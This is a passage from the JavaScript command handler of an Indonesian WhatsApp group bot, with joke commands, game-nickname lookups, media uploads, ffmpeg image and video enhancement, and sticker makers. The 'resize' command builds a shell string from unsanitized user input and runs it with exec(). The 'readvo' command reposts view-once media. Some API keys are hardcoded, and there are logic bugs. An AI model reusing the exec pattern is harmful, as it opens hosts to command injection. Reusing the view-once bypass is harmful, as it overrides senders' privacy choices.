        'Menonton film', 'Travelling', 'Mendaki gunung', 'Fotografi', 'Melukis', 
        'Musik', 'Berkebun', 'Menggambar', 'Berburu', 'Mendengarkan podcast', 
        'Berbelanja', 'Mengoleksi barang antik', 'Berkendara motor', 'Menyelam', 
        'Bermain olahraga tim', 'Memancing', 'Menjahit', 'Mencipta seni', 'Seni bela diri', 
        'Coding', 'Yoga', 'Meditasi', 'Menulis puisi', 'Sewaktu-waktu berkumpul dengan teman', 
        'Berkreasi dengan DIY', 'Mendengarkan musik klasik', 'Menari', 'Bermain alat musik', 
        'Mendengarkan cerita horor', 'Berselancar', 'Bermain skateboard', 'Camping', 
        'Main kartu', 'Bermain catur', 'Bermain puzzle', 'Mempelajari bahasa baru', 
        'Mengajar', 'Berkumpul di acara komunitas', 'Fotografi alam', 'Menulis cerita fiksi', 
        'Berkendara sepeda', 'Main cosplay', 'Kegiatan sosial', 'Melakukan eksperimen kimia', 
        'Astrologi', 'Bermain dengan hewan peliharaan', 'Memperbaiki barang rusak', 'Berkunjung ke museum', 
        'Bermain tenis', 'Main golf', 'Bermain voli', 'Panjat tebing', 'Mendekorasi rumah', 
        'Sewaktu-waktu berkemah', 'Bermain basket', 'Membuat kerajinan tangan', 'Bermain piano', 
        'Bermain gitar', 'Mendengarkan musik rock', 'Main drum', 'Mengecat', 'Mengoleksi kartu', 
        'Sains eksperimen', 'Menciptakan aplikasi', 'Menjahit pakaian', 'Bermain frisbee', 
        'Bermain dengan teknologi', 'Berkendara mobil', 'Berkunjung ke pantai', 'Main catur', 
        'Mengunjungi tempat bersejarah', 'Berkebun tanaman hias', 'Menciptakan game', 'Bermain tenis meja', 
        'Bermain dengan mainan robotik', 'Bergabung dengan klub diskusi', 'Berkarya di YouTube', 'Menulis blog'
    ]
    const coli = hobi[Math.floor(Math.random() * hobi.length)]
    m.reply(`*Pertanyaan:* Cekhoby ${text}\n*Jawaban:* ${coli}`)
}
break

case 'jodoh':
case 'cekjodoh': {
    try {
        let target = text
            ? text.replace(/[@]/g, '').split('@')[0]
            : m.sender.split('@')[0]

        let member = participants
            .filter(u => typeof u.id === 'string' && u.id.includes('@'))
            .map(u => u.id.split('@')[0])

        if (!member.includes(target)) target = m.sender.split('@')[0]

        let jodoh = member[Math.floor(Math.random() * member.length)]
        let jawab = `*JODOHNYA ${Line.getName(target + '@s.whatsapp.net').toUpperCase()}*\n${target} ❤️ @${jodoh}`
        let menst = [`${target}@s.whatsapp.net`, `${jodoh}@s.whatsapp.net`]
        Line.sendMessage(from, { text: jawab, mentions: menst }, { quoted: m })
    } catch (err) {
        m.reply('Terjadi kesalahan: ' + err)
    }
}
break

// === Others Menu

case 'jadibot': {
  if (isOwner && isPremium) {
    jadibot(Line, m, m.chat)
  } else {
    m.reply('Fitur khusus owner dan premium!')
  }
}
break

case 'stopjadibot': {
  if (isOwner && isPremium) {
    m.reply('Sukses!')
    setTimeout(() => {
      stopjadibot(Line, m, m.chat)
    }, 400)
  } else {
    m.reply('Fitur khusus owner dan premium!')
  }
}
break

case 'listjadibot': {
  if (isOwner && isPremium) {
    listjadibot(Line, m)
  } else {
    m.reply('Fitur khusus owner dan premium!')
  }
}
break

case 'ceknickff': {
let ffnick = q.split(" ")[0]
if (!ffnick) return m.reply(`ID FF nya mana?`)
let nick1 = `${ffnick}`
axios('https://ariepulsa.com/api/get-nickname-game',{
method: 'POST',
data: new URLSearchParams(Object.entries({
api_key: ariekey,
action: 'get-nickname-game',
layanan: 'free-fire',
target: nick1,
}))}).then((res) => {
if (res.data.status == false) {
m.reply(`${res.data.data.pesan}`)
}
if (res.data.status == true) {
m.reply(`── 「  *YOUR NICKNAME*  」 ──\n\nGame: FreeFire\nID Game: ${ffnick}\nNickName: ${res.data.data.nickname}\n\n© ${storename}`)
}})
}
break

case 'ceknickml': {
let mlidnick = q.split(" ")[0]
let mlzonenick = q.split(" ")[1]
if (!mlidnick) return m.reply(`ID ML nya mana?\nContoh: ${prefix+command} 12255668 1244`)
if (!mlzonenick) return m.reply(`ID server nya mana?\nContoh: ${prefix+command} 12255668 1244`)
let nickid = `${mlidnick}`
let nickzone = `${mlzonenick}`
axios('https://ariepulsa.com/api/get-nickname-game',{
method: 'POST',
data: new URLSearchParams(Object.entries({
api_key: ariekey,
action: 'get-nickname-game',
layanan: 'mobile-legends',
target: nickid,
no_meter: nickzone,
}))}).then((res) => {
if (res.data.status == false) {
m.reply(`${res.data.data.pesan}`)
}
if (res.data.status == true) {
 m.reply(`── 「  *YOUR NICKNAME*  」 ──\n\nGame: Mobile Lengeds\nID Game: ${mlidnick}\nServer: (${mlzonenick})\nNickName: ${res.data.data.nickname}\n\n© ${storename}`)
}})
}
break

case 'upchaudio': {
if (!isOwner) return onlyOwn();
if (!/audio/.test(mime)) {
return m.reply(`🚩 *Reply audio dengan* _${prefix + command}_ *untuk mengunggah!*`);
}
Line.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
try {
const media = await Line.downloadAndSaveMediaMessage(quoted);
const anu = await uploadMedia(media);
const senderName = m.pushName || "Pengguna";
let profilePictureUrl;
try {
profilePictureUrl = await Line.profilePictureUrl(m.sender, 'image');
} catch {
profilePictureUrl = "https://files.catbox.moe/vikf6c.jpg";  
}
await Line.sendMessage(chjid + "@newsletter", {
audio: {
url: util.format(anu),
},
mimetype: 'audio/mpeg',
ptt: true,
contextInfo: {
forwardingScore: 9999,
isForwarded: true,
externalAdReply: {
title: `From: ${senderName}`,
body: "Hi Everyone!",
thumbnailUrl: profilePictureUrl,
sourceUrl: "https://lineaja.my.id",
mediaType: 1,
},
},
caption: text || "🎵 Audio berhasil diunggah",
});
await sleep(2000);
Line.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
m.reply(`*Audio berhasil diunggah dan dikirim!*`);      
} catch (error) {
console.error('Error saat upload audio:', error);
m.reply('*Terjadi kesalahan saat mengunggah audio.*\nSilakan coba lagi atau periksa koneksi Anda.');
Line.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
}   
break;
}
break

case 'upch-video': {
if (!isOwner) return onlyOwn()
if (!/video/.test(mime)) return m.reply(`\`\`\`🚩 Reply Video dengan ${prefix + command} untuk mengunggah\`\`\``);
Line.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
try {
const media = await Line.downloadAndSaveMediaMessage(quoted);
const anu = await uploadMedia(media);
Line.sendMessage(chjid + "@newsletter" , {
video: {
url: `${util.format(anu)}`,
},
caption: text, 
contextInfo: {
forwardingScore: 9999,
isForwarded: true,
externalAdReply: {
title: "Line - Wabot",
body: "",
thumbnailUrl: "https://files.catbox.moe/vikf6c.jpg",
sourceUrl: null,
mediaType: 1,
},
},
});
await sleep(2000);
Line.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
} catch (error) {
console.error(error);
m.reply('⚠️ Terjadi kesalahan saat mengunggah video.');
}
break;
}
break

case 'hd':
case 'hdr': 
case 'hdimg':
case 'remini':
case 'enhance': {
    if (!/image/.test(mime)) return m.reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
    await vreact();
    
    let media;
    try {
        const { remini } = require('./lib/general/scrape');
        media = await quoted.download();
        let proses = await remini(media, "enhance");
        Line.sendMessage(m.chat, { image: proses, caption: 'Sukses' }, { quoted: m });
    } catch (err) {
        try {
            if (!media) media = await quoted.download()
            let url = await uploadMedia(media)
                Line.sendMessage(m.chat, { image: { url: `https://ai.xterm.codes/api/tools/remini?url=${url}&key=Fourstore` }, caption: 'Sukses' }, { quoted: m });
        } catch (err) {
            m.reply('Error saat mengirim gambar: ' + err.message);
        }
    }}
break;

case 'recolor': {
if (!/image/.test(mime)) return m.reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
await vreact()
const { remini } = require('./lib/general/scrape')
let media = await quoted.download()
let proses = await remini(media, "recolor");
Line.sendMessage(m.chat, { image: proses, caption: 'Sukses'}, { quoted: m})
}
break

case 'dehaze': {
if (!/image/.test(mime)) return m.reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
await vreact()
const { remini } = require('./lib/general/scrape')
let media = await quoted.download()
let proses = await remini(media, "dehaze");
Line.sendMessage(m.chat, { image: proses, caption: 'Sukses'}, { quoted: m})
}
break

case 'hdvid720p': {
if (!/video/.test(mime)) {
return reply(`Kirim/kutip video dengan caption ${prefix + command}`);
}
let media = await quoted.download();
async function enhanceVideo(inputBuffer) {
const tempFilePath = path.join(os.tmpdir(), `input_${Date.now()}.mp4`);
await fs.promises.writeFile(tempFilePath, inputBuffer);
return new Promise((resolve, reject) => {
const outputFilePath = path.join(os.tmpdir(), `output_${Date.now()}.mp4`);
ffmpeg(tempFilePath)
.videoFilter('eq=contrast=1.2:brightness=0.1') 
.videoCodec('libx264')
.size('1280x720') // Resolusi HD 720p
.fps(60) // Set frame rate ke 60 FPS
.outputFormat('mp4')
.on('start', commandLine => console.log(`Started ffmpeg with command: ${commandLine}`))
.on('error', (err, stdout, stderr) => {
console.error('Error:', err);
console.error('ffmpeg stderr:', stderr);
reject(err || new Error('Error processing video'));
})
.on('end', () => {
console.log('Processing finished successfully');
fs.promises.readFile(outputFilePath)
.then(resolve)
.catch(reject)
.finally(() => {
// Menghapus file sementara
fs.unlink(tempFilePath, () => {});
fs.unlink(outputFilePath, () => {});
});
})
.save(outputFilePath);
});
}
try {
let processedVideo = await enhanceVideo(media);
await Line.sendMessage(m.chat, { video: processedVideo, caption: 'Sukses 720P 60FPS' }, { quoted: m });
} catch (error) {
console.error('Error:', error);
reply('Terjadi kesalahan saat memproses video. Silakan coba lagi.');
}
}
break

case 'hdvid1k': {   
if (!/video/.test(mime)) {
return reply(`Kirim/kutip video dengan caption ${prefix + command}`);
}
let media = await quoted.download();
async function enhanceVideo(inputBuffer) {
const tempFilePath = path.join(os.tmpdir(), `input_${Date.now()}.mp4`);
await fs.promises.writeFile(tempFilePath, inputBuffer);
return new Promise((resolve, reject) => {
const outputFilePath = path.join(os.tmpdir(), `output_${Date.now()}.mp4`);
ffmpeg(tempFilePath)
.videoFilter([
'eq=contrast=1.2:brightness=0.05:saturation=1.1', 
'unsharp=5:5:0.8:3:3:0.4', 
'scale=1920:1080'
])
.videoCodec('libx264')
.fps(60) 
.outputOptions('-preset slow') 
.outputOptions('-crf 20') 
.outputOptions('-pix_fmt yuv420p')
.outputOptions('-movflags +faststart') 
.outputFormat('mp4') 
.on('start', commandLine => console.log(`Started ffmpeg with command: ${commandLine}`))
.on('error', (err, stdout, stderr) => {
console.error('Error:', err);
console.error('ffmpeg stderr:', stderr);
reject(err || new Error('Error processing video'));
})
.on('end', () => {
console.log('Processing finished successfully');
fs.promises.readFile(outputFilePath)
.then(resolve)
.catch(reject)
.finally(() => {
fs.unlink(tempFilePath, () => {});
fs.unlink(outputFilePath, () => {});
});
})
.save(outputFilePath);
});
}
try {
let processedVideo = await enhanceVideo(media);
await Line.sendMessage(m.chat, { video: processedVideo, caption: 'Sukses 1080p 60FPS Jernih' }, { quoted: m });
} catch (error) {
console.error('Error:', error);
reply('Terjadi kesalahan saat memproses video. Silakan coba lagi.');
}
}
break

case 'hdvid4k': {
if (!/video/.test(mime)) {
return reply(`Kirim/kutip video dengan caption ${prefix + command}`);
}
let media = await quoted.download();
async function enhanceVideo(inputBuffer) {
const tempFilePath = path.join(os.tmpdir(), `input_${Date.now()}.mp4`);
await fs.promises.writeFile(tempFilePath, inputBuffer);

return new Promise((resolve, reject) => {
const outputFilePath = path.join(os.tmpdir(), `output_${Date.now()}.mp4`);
ffmpeg(tempFilePath)
.videoFilter('eq=contrast=1.2:brightness=0.1') 
.videoCodec('libx264')
.size('3840x2160')
.fps(60)
.outputOptions([
'-preset fast', 
'-crf 18',
'-profile:v high', 
'-level:v 5.2'
])
.outputFormat('mp4')
.on('start', commandLine => console.log(`Started ffmpeg with command: ${commandLine}`))
.on('error', (err, stdout, stderr) => {
console.error('Error:', err);
console.error('ffmpeg stderr:', stderr);
reject(err || new Error('Error processing video'));
})
.on('end', () => {
console.log('Processing finished successfully');
fs.promises.readFile(outputFilePath)
.then(resolve)
.catch(reject)
.finally(() => {
fs.unlink(tempFilePath, () => {});
fs.unlink(outputFilePath, () => {});
});
})
.save(outputFilePath);
});
}
try {
let processedVideo = await enhanceVideo(media);
await Line.sendMessage(m.chat, { video: processedVideo, caption: 'Sukses 4K 60FPS' }, { quoted: m });
} catch (error) {
console.error('Error:', error);
reply('Terjadi kesalahan saat memproses video. Silakan coba lagi.');
}
}
break

case 'hdvid2k': {
if (!/video/.test(mime)) {
return reply(`Kirim/kutip video dengan caption ${prefix + command}`);
}
let media = await quoted.download();
async function enhanceVideo(inputBuffer) {
const tempFilePath = path.join(os.tmpdir(), `input_${Date.now()}.mp4`);
await fs.promises.writeFile(tempFilePath, inputBuffer);
return new Promise((resolve, reject) => {
const outputFilePath = path.join(os.tmpdir(), `output_${Date.now()}.mp4`);
ffmpeg(tempFilePath)
.videoFilter('eq=contrast=1.2:brightness=0.1')
.videoCodec('libx264') 
.size('2560x1440')
.fps(60)
.outputFormat('mp4')
.on('start', commandLine => console.log(`Started ffmpeg with command: ${commandLine}`))
.on('error', (err, stdout, stderr) => {
console.error('Error:', err);
console.error('ffmpeg stderr:', stderr);
reject(err || new Error('Error processing video'));
})
.on('end', () => {
console.log('Processing finished successfully');
fs.promises.readFile(outputFilePath)
.then(resolve)
.catch(reject)
.finally(() => {
fs.unlink(tempFilePath, () => {});
fs.unlink(outputFilePath, () => {});
});
})
.save(outputFilePath);
});
}
try {
let processedVideo = await enhanceVideo(media);
await Line.sendMessage(m.chat, { video: processedVideo, caption: 'Sukses 2K 60FPS' }, { quoted: m });
} catch (error) {
console.error('Error:', error);
reply('Terjadi kesalahan saat memproses video. Silakan coba lagi.');
}
}
break

case 'ngl': {
  if (!text) return m.reply('Example: .ngl Oyyy Nek');
  try {
    let link = 'https://ngl.link/callmeline89540'; 
    let pesan = encodeURIComponent(text); 
    let url = `https://lineaja.my.id/api/tools/ngl?link=${encodeURIComponent(link)}&pesan=${pesan}&tipe=yourcrush`;
    
    let res = await fetch(url);
    let result = await res.json();
    
    if (result.success) {
      m.reply('Pesan gagal dikirim!');
    } else {
      m.reply('Pesan berhasil dikirim!.');
    }
  } catch (err) {
    m.reply(`Terjadi kesalahan: ${err.message}`);
  }
}
break

case 'linee': {
  try {
    let groups = await Line.groupFetchAllParticipating(); // Ambil semua grup yang diikuti bot
    let groupList = Object.values(groups); // Ubah ke dalam array
    
    if (groupList.length === 0) {
      return m.reply('Bot tidak tergabung dalam grup mana pun.');
    }

    // Kirim jumlah grup terlebih dahulu
    m.reply(`Bot tergabung dalam ${groupList.length} grup.`);

    let replyText = 'Memproses daftar grup:\n\n';
    let groupIds = [];

    groupList.forEach((group, index) => {
      replyText += `${index + 1}. ${group.subject}\n`;
      replyText += `ID: ${group.id}\n`;
      replyText += `Deskripsi: ${group.desc || 'Tidak ada deskripsi'}\n\n`;
      
      // Simpan ID grup untuk diproses lebih lanjut
      groupIds.push(group.id);
    });

    // Kirim daftar grup
    m.reply(replyText); 
    
    // Proses grup lebih lanjut (contoh)
    groupIds.forEach(async (groupId) => {
      try {
        let groupInfo = await Line.getGroupInfo(groupId);
        console.log(`Memproses grup: ${groupInfo.subject}`);
        // Lakukan sesuatu dengan informasi grup
      } catch (error) {
        console.error(`Gagal memproses grup ${groupId}: ${error.message}`);
      }
    });

  } catch (err) {
    m.reply(`Terjadi kesalahan: ${err.message}`);
  }
}
break

case 'tourl': {
    if (!quoted) return reply("Mana File Nya?");
    let mime = quoted.mimetype || '';    
    if (!/video/.test(mime) && !/image/.test(mime) && !/audio/.test(mime)) {
        return reply(`Kirim/reply gambar, video, atau audio dengan caption:\n${prefix + command}`);
    }
    await Line.sendMessage(m.chat, { react: { text: "🔎", key: m.key }});
    const { uploadMedia } = require('./lib/general/uploader');
    let media;
    try {
        media = await Line.downloadMediaMessage(quoted);
        console.log("Sedang Mengunduh Media:", media);
    } catch (err) {
        console.error("Error download media:", err.message);
        return reply(`Error Tidak Dapat Mengunduh Media.`);
    }
    if (!media || media.length === 0) {
        return reply(`Error Media Tidak Ditemukan atau Kosong.`);
    }
    try {
        let url = await uploadMedia(media, mime);

        let coo = `{\"display_text\":\"COPY LINK\",\"id\":\"P\",\"copy_code\":\"${url}\"}`;
        
        buttoncopy(m.chat, `*Link*: ${url}`, coo, m); 
    } catch (err) {
        console.error("Error Upload File:", err.message);
        reply(`Error Upload File: ${err.message}`);
    } finally {
        if (fs.existsSync(media)) fs.unlinkSync(media); 
    }
}
break;

case 'ssweb': {
    if (!args[0]) return m.reply(`Contoh: ${prefix+command} linknya`)
    const key = await pickRandom(["f4fd50", "f57572", "f45b80", "a8a45d", "0060ec", "b085e3"])
    vreact()
    try {
        await Line.sendMessage(m.chat, {image: {url: `https://api.screenshotmachine.com/?key=${key}&url=${args[0]}&device=phone&dimension=480x800&format=png&cacheLimit=0&delay=200` }, caption: `© ${wm}` }, {quoted: m })
    } catch (err) {
        console.error(err)
    }
}
break

case 'removebg':
case 'nobg': {
  if (!/image/.test(mime)) return m.reply(`Kirim/kutip gambar/stiker dengan caption ${command}`)
  vreact()
  let {
    removeBg
  } = require('./lib/general/scrape')
  let img = await quoted.download()
  let image = await removeBg(img)
  let result = await Buffer.from(image, "base64")
  Line.sendImage(m.chat, result, `© ${wm}`, m)
}
break

case 'resize': {
  if (!args[0]) return m.reply(`Contoh ${command} 300x300\nPanjangxlebar`)
  await vreact()
  let panjang = q.split('x')[0]
  let lebar = q.split('x')[1]
  let media = await Line.downloadAndSaveMediaMessage(quoted)
  let ran = getRandom('.jpeg')
  exec(`ffmpeg -i ${media} -vf scale=${panjang}:${lebar} ${ran}`, async (err) => {
    fs.unlinkSync(media)
    if (err) return m.reply(`Terjadi kesalahan`)
    let buffer453 = fs.readFileSync(ran)
    await Line.sendMessage(m.chat, {
      mimetype: 'image/jpeg',
      image: buffer453
    }, {
      quoted: m
    })
    fs.unlinkSync(ran)
  })
}
break

case 'qc':
case 'qcstick': {
  if (!args[0]) return m.reply(`Contoh: ${p_c} white halo`)
  if (!args[1]) return m.reply(`Contoh: ${p_c} white halo`)
  if (text.length > 80) return m.reply(`Maximal 80 karakter!`)
  vreact()
  let [color, ...message] = text.split(' ');
  message = m.quoted ? m.quoted : message.join(' ');
  let backgroundColor;
  switch (color) {
  case 'pink':
    backgroundColor = '#f68ac9';
    break
  case 'blue':
    backgroundColor = '#6cace4';
    break
  case 'red':
    backgroundColor = '#f44336';
    break
  case 'green':
    backgroundColor = '#4caf50';
    break
  case 'yellow':
    backgroundColor = '#ffeb3b';
    break
  case 'purple':
    backgroundColor = '#9c27b0';
    break
  case 'darkblue':
    backgroundColor = '#0d47a1';
    break
  case 'lightblue':
    backgroundColor = '#03a9f4';
    break
  case 'ash':
    backgroundColor = '#9e9e9e';
    break
  case 'orange':
    backgroundColor = '#ff9800';
    break
  case 'black':
    backgroundColor = '#000000';
    break
  case 'white':
    backgroundColor = '#ffffff';
    break
  case 'teal':
    backgroundColor = '#008080';
    break
  case 'lightpink':
    backgroundColor = '#FFC0CB';
    break
  case 'chocolate':
    backgroundColor = '#A52A2A';
  case 'salmon':
    backgroundColor = '#FFA07A';
    break
  case 'magenta':
    backgroundColor = '#FF00FF';
    break
  case 'tan':
    backgroundColor = '#D2B48C';
    break
  case 'wheat':
    backgroundColor = '#F5DEB3';
    break
  case 'deeppink':
    backgroundColor = '#FF1493';
    break
  case 'fire':
    backgroundColor = '#B22222';
    break
  case 'skyblue':
    backgroundColor = '#00BFFF';
    break
  case 'orange':
    backgroundColor = '#FF7F50';
    break
  case 'brightskyblue':
    backgroundColor = '#1E90FF';
    break
  case 'hotpink':
    backgroundColor = '#FF69B4';
    break
  case 'lightskyblue':
    backgroundColor = '#87CEEB';
    break
  case 'seagreen':
    backgroundColor = '#20B2AA';
    break
  case 'darkred':
    backgroundColor = '#8B0000';
    break
  case 'orangered':
    backgroundColor = '#FF4500';
    break
  case 'cyan':
    backgroundColor = '#48D1CC';
    break
  case 'violet':
    backgroundColor = '#BA55D3';
    break
  case 'mossgreen':
    backgroundColor = '#00FF7F';
    break
  case 'darkgreen':
    backgroundColor = '#008000';
    break
  case 'navyblue':
    backgroundColor = '#191970';
    break
  case 'darkorange':
    backgroundColor = '#FF8C00';
    break
  case 'darkpurple':
    backgroundColor = '#9400D3';
    break
  case 'fuchsia':
    backgroundColor = '#FF00FF';
    break
  case 'darkmagenta':
    backgroundColor = '#8B008B';
    break
  case 'darkgray':
    backgroundColor = '#2F4F4F';
    break
  case 'peachpuff':
    backgroundColor = '#FFDAB9';
    break
  case 'darkishgreen':
    backgroundColor = '#BDB76B';
    break
  case 'darkishred':
    backgroundColor = '#DC143C';
    break
  case 'goldenrod':
    backgroundColor = '#DAA520';
    break
  case 'darkishgray':
    backgroundColor = '#696969';
    break
  case 'darkishpurple':
    backgroundColor = '#483D8B';
    break
  case 'gold':
    backgroundColor = '#FFD700';
    break
  case 'silver':
    backgroundColor = '#C0C0C0';
    break
  default:
    return m.reply('Warna tersebut tidak ditemukan!')
  }
  let obj = {
    type: 'quote',
    format: 'png',
    backgroundColor,
    width: 1900,
    height: 1024,
    scale: 100,
    messages: [{
      entities: [],
      avatar: true,
      from: {
        id: 1,
        name: db.data.users[m.sender].nama,
        photo: {
          url: await Line.profilePictureUrl(m.sender, "image").catch(() => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg'),
        }
      },
      text: message,
      replyMessage: {},
    }, ],
  };
  let response = await axios.post('https://quotly.netorare.codes/generate', obj, {
    headers: {
      'Content-Type': 'application/json',
    },
  });
  let buffer = Buffer.from(response.data.result.image, 'base64');
  Line.sendImageAsSticker(m.chat, buffer, m, {
    packname: ``,
    author: `${author}`
  })
}
break

case 'qckode':
case 'kodeqc': {
  m.reply(`${monospace("LIST  WARNA")}\n\n• Pink\n• Blue\n• Red\n• Green\n• Yellow\n• Purple\n• Darkblue\n• Lightblue\n• Ash\n• Orange\n• black\n• White\n• Teal\n• Lightpink\n• Chocolate\n• Salmon\n• Magenta\n• Tan\n• Wheat\n• Deeppink\n• Fire\n• Skyblue\n• Safron\n• Brightskyblue\n• Hotpink\n• Lightskyblue\n• Seagreen\n• Darkred\n• Orangered\n• Cyan\n• Violet\n• Mossgreen\n• Darkgreen\n• Navyblue\n• Darkorange\n• Darkpurple\n• Fuchsia\n• Darkmagenta\n• Darkgray\n• Peachpuff\n• Plackishgreen\n• Darkishred\n• Goldenrod\n• Darkishgray\n• Darkishpurple\n• Gold\n• Silver`)
}
break

case 's':
case 'stiker':
case 'sticker': {
if (!quoted) return m.reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
vreact()
if (/image/.test(mime)) {
let media = await Line.downloadAndSaveMediaMessage(quoted, + new Date * 1)
await Line.imgToSticker(m.chat, media, m, { packname: `` , author: author })
await fs.unlinkSync(media)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 25) return m.reply('Maksimal 25 detik!')
let media = await Line.downloadAndSaveMediaMessage(quoted, + new Date * 1)
await Line.vidToSticker(m.chat, media, m, { packname: `` , author: author })
await fs.unlinkSync(media)
} else if (/sticker/.test(mime)) {
let media = await Line.downloadAndSaveMediaMessage(quoted, + new Date * 1)
await Line.sendStickerFromUrl(m.chat, media, m, {packname: `` , author: author })
await fs.unlinkSync(media)
} else m.reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
}
break

case 'smeme': {
  if (!/webp/.test(mime) && /image/.test(mime)) {
    vreact()
    atas = text.split('|')[0] ? text.split('|')[0] : '-'
    bawah = text.split('|')[1] ? text.split('|')[1] : '-'
    mee = await Line.downloadAndSaveMediaMessage(quoted)
    mem = await CatBox(mee)
    let smeme = await fetch(`https://api.memegen.link/images/custom/${Enc(atas)}/${Enc(bawah)}.png?background=${mem}`)
    let smem = await smeme.buffer()
    await Line.sendImageAsSticker(m.chat, smem, m, {
      packname: ``,
      author: `${author} | ${db.data.users[m.sender].nama}`
    })
  } else {
    m.reply(`Kirim/kutip gambar dengan caption ${command} sanjaya|toyaa`)
  }
}
break

case 'wm':
case 'swm': {
if (!quoted) return m.reply(`Kirim/kutip stiker lalu ketik ${prefix+command} San|Abc`)
teks1 = text.split('|')[0] ? text.split('|')[0] : ''
teks2 = text.split('|')[1] ? text.split('|')[1] : ''
vreact()
if (/image/.test(mime)) {
let media = await quoted.download()
let stiker = await sticker5(media, false, `${teks1}`, `${teks2}`)
if (stiker) return Line.sendFile(m.chat, stiker, 'Quotly.webp', '', m)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 25) return m.reply('Maksimal 25 detik!')
let media = await quoted.download()
let stiker = await sticker5(media, false, `${teks1}`, `${teks2}`)
if (stiker) return Line.sendFile(m.chat, stiker, 'Quotly.webp', '', m)
} else {
m.reply(`Kirim/kutip stiker lalu ketik ${prefix+command} San|Abc`)
}}
break

case 'gtts':
case 'say': {
if (!text) return m.reply(`Contoh: ${prefix+command} aku sayang toya`)
await vreact()
let anu = await fetchJson(`https://api.erdwpe.com/api/soundoftext?text=${text}&lang=id-ID`)
const aud = anu.result
Line.sendMessage(m.chat, {audio : {url : aud}, mimetype:'audio/mpeg', ptt: true}, {quoted:m})
}
break

case 'readvo':
case 'rvo': {
if (!m.quoted) return m.reply('Kutip pesan view once nya!')
  if (m.quoted.mtype !== 'viewOnceMessageV2') return m.reply('Ini bukan pesan view-once!')
  let msg = m.quoted.message
  let type = Object.keys(msg)[0]
  let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
  let buffer = Buffer.from([])
  for await (const chunk of media) {
    buffer = Buffer.concat([buffer, chunk])
  }
  if (/video/.test(type)) {
    return Line.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
  } else if (/image/.test(type)) {
    return Line.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
  }
}
break

case 'getvideo': {
if (!text) return m.reply(`Contoh: ${prefix+command} 1`)
if (!m.quoted) return m.reply('Reply pesan ytsearch bot!')
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) return m.reply(`Mungkin pesan yang kamu reply tidak mengandung hasil ytsearch`)
await vreact()
downloadMp4(urls[text - 1])
}
break

case 'getmusic': {
if (!text) return m.reply(`Contoh: ${prefix+command} 1`)
if (!m.quoted) return m.reply('Reply pesan ytsearch bot!')
let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
if (!urls) return m.reply(`Mungkin pesan yang kamu reply tidak mengandung hasil ytsearch`)
await vreact()
downloadMp3(urls[text - 1])
}
break

case 'cekodam':
case 'cekkodam':
case 'cekkhodam': {
if (!text) return m.reply(`Contoh: ${prefix+command} toya`)
const khodam = pickRandom([
"Kaleng Cat Avian",
"Pipa Rucika",
"Botol Tupperware",
"Badut Mixue",
"Sabun GIV",
"Sandal Swallow",
"Jarjit",
"Ijat",
"Fizi",
"Mail",
"Ehsan",
"Upin",
"Ipin",
"Sungut Lele",
"Tok Dalang",
"Opah",
"Opet",
"Alul",
"Pak Vinsen",
"Maman Resing",
"Pak RT",
"Admin ETI",
"Bung Towel",
"Lumpia Basah",
"Martabak Manis",
"Baso Tahu",
"Tahu Gejrot",
"Dimsum",
"Seblak Ceker",
"Telor Gulung",
"Tahu Aci",
"Tempe Mendoan",
"Nasi Kucing",
"Kue Cubit",
"Tahu Sumedang",
"Nasi Uduk",
"Wedang Ronde",
"Kerupuk Udang",
"Cilok",
"Cilung",
"Kue Sus",
"Jasuke",
"Seblak Makaroni",
"Sate Padang",
"Sayur Asem",
"Kromboloni",
"Marmut Pink",
"Belalang Mullet",
"Kucing Oren",
"Lintah Terbang",
"Singa Paddle Pop",
"Macan Cisewu",
"Vario Mber",
"Beat Mber",
"Supra Geter",
"Oli Samping",
"Knalpot Racing",
"Jus Stroberi",
"Jus Alpukat",
"Alpukat Kocok",
"Es Kopyor",
"Es Jeruk",
"Cappucino Cincau",
"Jasjus Melon",
"Teajus Apel",
"Pop ice Mangga",
"Teajus Gulabatu",
"Air Selokan",
"Air Kobokan",
"TV Tabung",
"Keran Air",
"Tutup Panci",
"Kotak Amal",
"Tutup Termos",
"Tutup Botol",
"Kresek Item",
"Kepala Casan",
"Ban Serep",
"Kursi Lipat",
"Kursi Goyang",
"Kulit Pisang",
"Warung Madura",
"Gorong-gorong",
"Tai Kuda",
"Tikus Kentut",
"Banteng Merah",
"Bajigur",
"Bakso Sumatra",
"Neymar Bogor",
"Christiano Rojali",
"Batagor",
"Seblak Kalimantan",
"Macan Putih",
"Harimau Sumatra",
"Harimau Putih",
"Singa",
"Raja Iblis",
"Telur Betawi",
"Cilok Goreng",
])
const response = `
${monospace("CEK  KHODAM")}
- Nama: `+`${kapital(text)}`+`
- Khodam: ${khodam}
`
m.reply(response)
try {
let tek = `Khodam nya ${text}, adalah: ${khodam}`
let anu = await fetchJson(`https://api.erdwpe.com/api/soundoftext?text=${tek}&lang=id-ID`)
const aud = anu.result
await sleep(50)
Line.sendMessage(m.chat, {audio : {url : aud}, mimetype:'audio/mpeg', ptt: true}, {quoted:m})
} catch(err) {
m.reply('Terjadi kesalahan')
}}
break

case 'toimage':
case 'toimg': {
try {
if (!/webp/.test(mime)) return m.reply(`Kutip stiker dengan caption ${prefix+command}`)
await vreact()
